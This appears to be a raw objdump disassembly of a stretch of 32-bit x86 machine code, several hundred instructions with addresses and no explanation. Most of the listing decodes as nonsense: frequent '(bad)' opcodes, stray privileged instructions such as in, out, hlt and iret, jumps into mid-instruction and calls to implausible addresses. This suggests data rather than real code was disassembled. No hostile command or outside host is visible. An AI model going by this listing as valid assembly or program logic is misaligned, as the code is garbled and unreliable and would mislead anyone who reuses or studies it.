  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
